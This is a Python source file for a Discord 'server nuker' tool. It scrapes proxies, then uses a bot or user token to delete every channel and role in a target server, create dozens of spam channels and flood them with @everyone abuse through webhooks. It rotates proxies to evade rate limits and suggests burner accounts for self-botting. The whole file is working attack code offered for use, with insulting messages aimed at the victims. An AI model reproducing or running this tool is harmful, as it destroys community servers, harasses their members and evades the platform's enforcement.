#------------------------------------------------------------------------------------------------------------#
# ALiteralNuker Nitro
# this shit is ass rn so jus wait till updates
# might've been helped by AI cuz i didn't know how to make a proper proxy checking system (im retarded sorry)
#------------------------------------------------------------------------------------------------------------#

import discord
import asyncio
import aiohttp
import random
import os
import json
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.theme import Theme

# --- THEME & CONFIG ---
console = Console(theme=Theme({"info": "cyan", "warning": "yellow", "danger": "bold red", "title": "bold magenta", "subtitle": "cyan", "border": "magenta", "menu_item": "cyan", "menu_header": "bold magenta"}))
CONFIG_FILE, PROXIES_FILE = "config.json", "proxies.txt"
DEFAULT_CONFIG = {
    "channel_names": ["cry-about-it", "get-fucked", "ez-nuke", "owned-by-skitdev", "rip-this-server"],
    "spam_messages": ["@everyone get clapped lmao 💀", "@everyone this server is my property now", "@everyone cope harder 🥀", "@everyone should've had better security dumbass"],
    "webhook_names": ["your worst nightmare", "ez clap", "the owner"],
    "role_names": ["OWNED", "CLAPPED", "GET GOOD"],
    "server_name": "Owned by SkitDev 🥀",
    "server_icon_url": "https://i.ibb.co/W4xJsg2t/alnnitro.png",
    "webhook_avatar_url": "https://i.ibb.co/W4xJsg2t/alnnitro.png"
}

# --- ASCII & MENU ---
def get_ascii():
    return Text(""" ▄▄▄       ██▓     ███▄    █     ███▄    █  ██▓▄▄▄█████▓ ██▀███   ▒█████  
▒████▄    ▓██▒     ██ ▀█   █     ██ ▀█   █ ▓██▒▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒
▒██  ▀█▄  ▒██░    ▓██  ▀█ ██▒   ▓██  ▀█ ██▒▒██▒▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒
░██▄▄▄▄██ ▒██░    ▓██▒  ▐▌██▒   ▓██▒  ▐▌██▒░██░░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░
 ▓█   ▓██▒░██████▒▒██░   ▓██░   ▒██░   ▓██░░██░  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░
 ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░   ▒ ▒    ░ ▒░   ▒ ▒ ░▓    ▒ ░░   ░ ▓▓ ░▒▓░░ ▒░▒░▒░ 
  ▒   ▒▒ ░░ ░ ▒  ░░ ░░   ░ ▒░   ░ ░░   ░ ▒░ ▒ ░    ░      ░▒ ░ ▒░  ░ ▒ ▒░ 
  ░   ▒     ░ ░      ░   ░ ░       ░   ░ ░  ▒ ░  ░        ░░   ░ ░ ░ ░ ▒  
      ░  ░    ░  ░         ░             ░  ░              ░         ░ ░  """, style="title")
MENU = "[menu_item][1] - [/menu_item][bold green]Webhook Bomber[/bold green]\n[menu_item][2] - [/menu_item][bold yellow]Server Nuker (Bot)[/bold yellow]\n[menu_item][3] - [/menu_item][danger]Server Nuker (Self-Bot - RISKY 💀)[/danger]\n[menu_item][4] - [/menu_item][info]Proxy Scraper[/info]\n[menu_item][5] - [/menu_item][info]Proxy Checker[/info]\n[menu_item][6] - [/menu_item][bold blue]Settings[/bold blue]\n[menu_item][7] - [/menu_item][bold white]Exit[/bold white]"

class ProxyManager:
    def __init__(self):
        self.all_proxies = set()
        self.working_proxies = []
        self.lock = asyncio.Lock()

    async def load_proxies(self):
        if not os.path.exists(PROXIES_FILE): return
        with open(PROXIES_FILE, "r") as f: self.all_proxies.update(p.strip() for p in f.readlines() if p.strip())
        console.print(f"[info]Loaded {len(self.all_proxies)} unique proxies from file.[/info]")

    async def scrape(self):
        console.print("[warning]Scraping new proxies from multiple sources...[/warning]")
        # I updated this list. No guarantees.
        sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
            "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
            "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
            "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
            "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt"
        ]
        async with aiohttp.ClientSession() as session:
            tasks = [asyncio.create_task(session.get(url, ssl=False, timeout=10)) for url in sources]
            for task in asyncio.as_completed(tasks):
                try:
                    resp = await task
                    if resp.status == 200:
                        text = await resp.text()
                        self.all_proxies.update(p for p in text.strip().split('\n') if p.strip())
                except Exception: continue
        with open(PROXIES_FILE, "w") as f: f.write('\n'.join(self.all_proxies))
        console.print(f"[green]Scraped and saved {len(self.all_proxies)} total unique proxies.[/green]")

    async def check(self):
        self.working_proxies.clear()
        if not self.all_proxies:
            console.print("[danger]No proxies loaded to check. Scrape some first.[/danger]")
            return

        console.print("[warning]Checking a random sample of proxies to find working ones quickly...[/warning]")
        
        sample_size = 300 
        proxies_to_check = random.sample(list(self.all_proxies), min(sample_size, len(self.all_proxies)))
        
        sem = asyncio.Semaphore(500)
        
        async def check_proxy(proxy, session):
            async with sem:
                try:
                    async with session.get("http://connectivitycheck.gstatic.com/generate_204", proxy=f"http://{proxy}", timeout=3, ssl=False) as resp:
                        if resp.status == 204:
                            async with self.lock:
                                self.working_proxies.append(proxy)
                except Exception:
                    pass

        async with aiohttp.ClientSession() as session:
            tasks = [check_proxy(p, session) for p in proxies_to_check]
            with Progress(*Progress.get_default_columns(), console=console) as progress:
                for f in progress.track(asyncio.as_completed(tasks), total=len(tasks), description="[cyan]Blasting through checks..."):
                    await f
        
        console.print(f"[green]Found {len(self.working_proxies)} working proxies from the sample.[/green]")

    async def get_proxy(self):
        async with self.lock:
            return random.choice(self.working_proxies) if self.working_proxies else None

    async def remove_proxy(self, proxy):
        async with self.lock:
            if proxy in self.working_proxies:
                self.working_proxies.remove(proxy)

class ALNNitro:
    def __init__(self):
        self.config = DEFAULT_CONFIG
        self.proxy_manager = ProxyManager()
        self.load_config()

    def load_config(self):
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, "r") as f:
                try: self.config.update(json.load(f))
                except json.JSONDecodeError: console.print("[danger]Config file is corrupted. Using defaults.[/danger]")
        console.print("[info]Config loaded.[/info]")

    def save_config(self):
        with open(CONFIG_FILE, "w") as f: json.dump(self.config, f, indent=4)
        console.print("[green]Config saved.[/green]")

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        console.print(Panel(get_ascii(), title="[title]ALiteralNuker Nitro[/title]", subtitle="[subtitle]FUELED BY SKITDEV[/subtitle]", border_style="border"))
    
    async def make_request(self, session, method, url, headers=None, json_payload=None):
        headers = headers or {}
        base_delay, retries = 1, 4 
        for i in range(retries):
            proxy = await self.proxy_manager.get_proxy()
            proxy_url = f"http://{proxy}" if proxy else None
            try:
                await asyncio.sleep(random.uniform(0.05, 0.2))
                async with session.request(method, url, headers=headers, json=json_payload, proxy=proxy_url, timeout=7, ssl=False) as resp:
                    if resp.status in [200, 201, 204]:
                        return await resp.json() if resp.content_type == 'application/json' else True
                    elif resp.status == 429:
                        retry_after = (await resp.json()).get("retry_after", base_delay * (2 ** i))
                        sleep_time = retry_after + random.uniform(0.2, 0.7)
                        console.print(f"[warning]Rate limited. Waiting {sleep_time:.2f}s...[/warning]")
                        await asyncio.sleep(sleep_time)
                    else:
                        await self.proxy_manager.remove_proxy(proxy)
            except Exception:
                await self.proxy_manager.remove_proxy(proxy)
        
        try:
            async with session.request(method, url, headers=headers, json=json_payload, timeout=7, ssl=False) as resp:
                if resp.status in [200, 201, 204]:
                    console.print("[warning]Proxies failed, using direct connection...[/warning]")
                    return await resp.json() if resp.content_type == 'application/json' else True
        except Exception: pass
        return False

    async def webhook_bomber(self):
        self.clear_screen()
        url = console.input("[info]> Webhook URL: [/info]")
        count = int(console.input("[info]> Message Count: [/info]"))
        
        async with aiohttp.ClientSession() as session:
            with Progress(*Progress.get_default_columns(), console=console) as progress:
                tasks = []
                for _ in range(count):
                    payload = {"content": random.choice(self.config["spam_messages"]), "username": random.choice(self.config["webhook_names"]), "avatar_url": self.config["webhook_avatar_url"]}
                    tasks.append(self.make_request(session, "POST", url, json_payload=payload))
                
                for f in progress.track(asyncio.as_completed(tasks), total=len(tasks), description="[danger]Bombing..."):
                    await f

    async def nuke(self, guild_id, token, is_bot=True):
        auth_header = f"Bot {token}" if is_bot else token
        headers = {"Authorization": auth_header, "Content-Type": "application/json", "X-Audit-Log-Reason": "Nuked by ALNNitro"}
        base_url = "https://discord.com/api/v9"
        
        console.print(f"[danger]Initiating proxy-based nuke on {guild_id}...[/danger]")

        async with aiohttp.ClientSession() as session:
            guild_info = await self.make_request(session, "GET", f"{base_url}/guilds/{guild_id}", headers)
            if not guild_info:
                console.print("[danger]Failed to access guild. Check token/bot perms.[/danger]")
                return

            console.print(f"[info]Target locked: {guild_info.get('name', 'Unknown Server')}[/info]")
            channels = await self.make_request(session, "GET", f"{base_url}/guilds/{guild_id}/channels", headers) or []
            roles = await self.make_request(session, "GET", f"{base_url}/guilds/{guild_id}/roles", headers) or []

            console.print("[warning]Wiping everything...[/warning]")
            tasks = [self.make_request(session, "DELETE", f"{base_url}/channels/{ch['id']}", headers) for ch in channels]
            tasks.extend([self.make_request(session, "DELETE", f"{base_url}/guilds/{guild_id}/roles/{role['id']}", headers) for role in roles if role['name'] != '@everyone'])
            await asyncio.gather(*tasks)
            
            console.print("[warning]Rebuilding in our image...[/warning]")
            tasks = [self.make_request(session, "POST", f"{base_url}/guilds/{guild_id}/channels", headers, {"name": random.choice(self.config["channel_names"]), "type": 0}) for _ in range(50)]
            new_channels_data = await asyncio.gather(*tasks)
            
            console.print("[warning]Spamming Webhooks...[/warning]")
            webhook_tasks = []
            for channel_data in new_channels_data:
                if not channel_data or 'id' not in channel_data: continue
                webhook_data = await self.make_request(session, "POST", f"{base_url}/channels/{channel_data['id']}/webhooks", headers, {"name": "SkitDev Was Here"})
                if webhook_data and 'url' in webhook_data:
                    for _ in range(10):
                        payload = {"content": random.choice(self.config["spam_messages"]), "username": random.choice(self.config["webhook_names"]), "avatar_url": self.config["webhook_avatar_url"]}
                        webhook_tasks.append(self.make_request(session, "POST", webhook_data['url'], json_payload=payload))
            await asyncio.gather(*webhook_tasks)
        
        console.print(f"[title]Nuke has been successfully completed.[/title]")

    def settings(self):
        self.clear_screen()
        console.print(Panel("[title]Customize Everything[/title]"))
        for key, current_val in self.config.items():
            val_str = ', '.join(current_val) if isinstance(current_val, list) else current_val
            prompt = f"[info]{key.replace('_', ' ').title()} > [/info]\n[dim]Current: {val_str}[/dim]" if isinstance(current_val, list) else f"[info]{key.replace('_', ' ').title()} (current: {val_str}) > [/info]"
            new_val = console.input(prompt)
            if new_val: self.config[key] = [n.strip() for n in new_val.split(',')] if isinstance(current_val, list) else new_val
        self.save_config()
        console.print("[green]Settings updated.[/green]")

    async def run(self):
        await self.proxy_manager.load_proxies()
        while True:
            self.clear_screen()
            console.print(Panel(MENU, title="[menu_header]Select Your Weapon[/menu_header]", border_style="border"))
            choice = console.input("[info]> [/info]")
            try:
                if choice == '1': await self.webhook_bomber()
                elif choice == '2':
                    token = console.input("[info]> Bot Token: [/info]")
                    guild_id = console.input("[info]> Server ID: [/info]")
                    await self.nuke(guild_id, token, is_bot=True)
                elif choice == '3':
                    console.print("[danger]WARNING: Self-botting will get your account banned. Use a burner.[/danger]")
                    token = console.input("[info]> User Token: [/info]")
                    guild_id = console.input("[info]> Server ID: [/info]")
                    await self.nuke(guild_id, token, is_bot=False)
                elif choice == '4': await self.proxy_manager.scrape()
                elif choice == '5': await self.proxy_manager.check()
                elif choice == '6': self.settings()
                elif choice == '7': break
                else: console.print("[danger]Invalid choice.[/danger]"); await asyncio.sleep(1)
            except Exception as e:
                console.print(f"[danger]An error occurred: {e}[/danger]")
                
            if choice in ['1','2','3','4','5','6']:
                console.input("\n[warning]Press Enter to continue...[/warning]")
        
        console.print("[title]Later, skater. 🥀[/title]")

async def main():
    nuker = ALNNitro()
    await nuker.run()

if __name__ == "__main__":
    asyncio.run(main())
